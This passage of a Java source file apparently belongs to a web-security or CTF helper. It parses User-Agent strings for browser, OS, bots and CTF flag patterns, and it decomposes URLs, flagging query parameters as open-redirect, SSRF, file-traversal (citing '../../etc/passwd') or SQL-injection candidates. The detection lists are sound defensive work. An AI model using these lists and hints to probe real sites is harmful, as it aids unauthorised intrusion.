        else if (lower.contains("bingbot")) { isBot = true; botName = "Bingbot Search Indexer"; }

        if (lower.contains("flag{") || lower.contains("ctf{")) {
            ctfAlerts.add("CRITICAL: CTF Flag pattern found inside User-Agent header!");
        }
        if (lower.contains("admin") || lower.contains("internal") || lower.contains("localhost")) {
            ctfAlerts.add("Suspicious spoofing pattern ('admin' / 'internal') detected in User-Agent.");
        }

        if (lower.contains("windows nt 10.0")) os = "Windows 10 / 11";
        else if (lower.contains("windows nt 6.3")) os = "Windows 8.1";
        else if (lower.contains("windows nt 6.1")) os = "Windows 7";
        else if (lower.contains("mac os x")) os = "macOS";
        else if (lower.contains("android")) { os = "Android"; device = "Mobile"; }
        else if (lower.contains("iphone") || lower.contains("ipad")) { os = "iOS"; device = lower.contains("ipad") ? "Tablet" : "Mobile"; }
        else if (lower.contains("linux")) os = "Linux";

        if (lower.contains("edg/")) { browser = "Microsoft Edge"; engine = "Blink"; }
        else if (lower.contains("chrome/") && !lower.contains("chromium")) { browser = "Google Chrome"; engine = "Blink"; }
        else if (lower.contains("firefox/")) { browser = "Mozilla Firefox"; engine = "Gecko"; }
        else if (lower.contains("safari/") && !lower.contains("chrome")) { browser = "Apple Safari"; engine = "WebKit"; }
        else if (lower.contains("trident/") || lower.contains("msie")) { browser = "Internet Explorer"; engine = "Trident"; }

        java.util.regex.Pattern verPattern = java.util.regex.Pattern.compile("(?:Chrome|Firefox|Edg|Version|curl|sqlmap)/(\\d+[\\.\\d]*)");
        java.util.regex.Matcher vm = verPattern.matcher(raw);
        if (vm.find()) {
            browserVersion = vm.group(1);
        }

        result.put("raw", raw);
        result.put("browser", browser);
        result.put("browserVersion", browserVersion);
        result.put("os", os);
        result.put("engine", engine);
        result.put("device", device);
        result.put("isBot", isBot);
        result.put("botName", botName != null ? botName : "N/A");
        result.put("ctfAlerts", ctfAlerts);

        return result;
    }

    // ── URL Parser & Parameter Decomposer ───────────────────────
    public Map<String, Object> decomposeUrl(String urlString) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (urlString == null || urlString.trim().isEmpty()) {
            result.put("error", "URL string cannot be empty");
            return result;
        }

        String raw = urlString.trim();
        if (!raw.contains("://") && !raw.startsWith("//")) {
            raw = "http://" + raw;
        }

        try {
            java.net.URI uri = java.net.URI.create(raw);
            String scheme = uri.getScheme() != null ? uri.getScheme() : "http";
            String host = uri.getHost() != null ? uri.getHost() : "";
            int port = uri.getPort() != -1 ? uri.getPort() : ("https".equalsIgnoreCase(scheme) ? 443 : 80);
            String path = uri.getPath() != null && !uri.getPath().isEmpty() ? uri.getPath() : "/";
            String query = uri.getRawQuery() != null ? uri.getRawQuery() : "";
            String fragment = uri.getFragment() != null ? uri.getFragment() : "";

            List<Map<String, String>> params = new ArrayList<>();
            List<Map<String, String>> securityAlerts = new ArrayList<>();

            if (!query.isEmpty()) {
                String[] pairs = query.split("&");
                for (String pair : pairs) {
                    if (pair.isEmpty()) continue;
                    String[] kv = pair.split("=", 2);
                    String key = java.net.URLDecoder.decode(kv[0], StandardCharsets.UTF_8);
                    String val = kv.length > 1 ? java.net.URLDecoder.decode(kv[1], StandardCharsets.UTF_8) : "";
                    params.add(Map.of("key", key, "value", val));

                    String kLower = key.toLowerCase();
                    if (List.of("redirect", "next", "url", "dest", "return", "to", "goto", "out").contains(kLower)) {
                        securityAlerts.add(Map.of("param", key, "type", "Open Redirect", "risk", "HIGH",
                                "desc", "Parameter commonly targeted for Open Redirect vulnerabilities."));
                    }
                    if (List.of("api", "proxy", "webhook", "fetch", "target", "feed", "uri").contains(kLower)) {
                        securityAlerts.add(Map.of("param", key, "type", "SSRF Candidate", "risk", "CRITICAL",
                                "desc", "Parameter commonly resolves external endpoints; check for SSRF / cloud metadata queries."));
                    }
                    if (List.of("file", "page", "path", "include", "view", "doc", "template").contains(kLower)) {
                        securityAlerts.add(Map.of("param", key, "type", "LFI / Traversal Candidate", "risk", "HIGH",
                                "desc", "Parameter takes file/template names; check for traversal (../../etc/passwd)."));
                    }
                    if (List.of("id", "user", "uid", "cat", "query", "order", "sort").contains(kLower)) {
                        securityAlerts.add(Map.of("param", key, "type", "SQLi / IDOR Candidate", "risk", "MEDIUM",
                                "desc", "Numeric or query identifier; check for SQL injection or Insecure Direct Object References."));
                    }
                }
            }

            String[] segments = Arrays.stream(path.split("/"))
                    .filter(s -> !s.isEmpty())
                    .toArray(String[]::new);

            result.put("raw", urlString);
            result.put("normalized", raw);
            result.put("protocol", scheme);
            result.put("host", host);
            result.put("port", port);
            result.put("path", path);
            result.put("segments", segments);
            result.put("queryString", query);
            result.put("fragment", fragment);
            result.put("params", params);
            result.put("paramsCount", params.size());
            result.put("securityAlerts", securityAlerts);

        } catch (Exception e) {
            result.put("error", "Invalid URL: " + e.getMessage());
        }

        return result;
    }
}
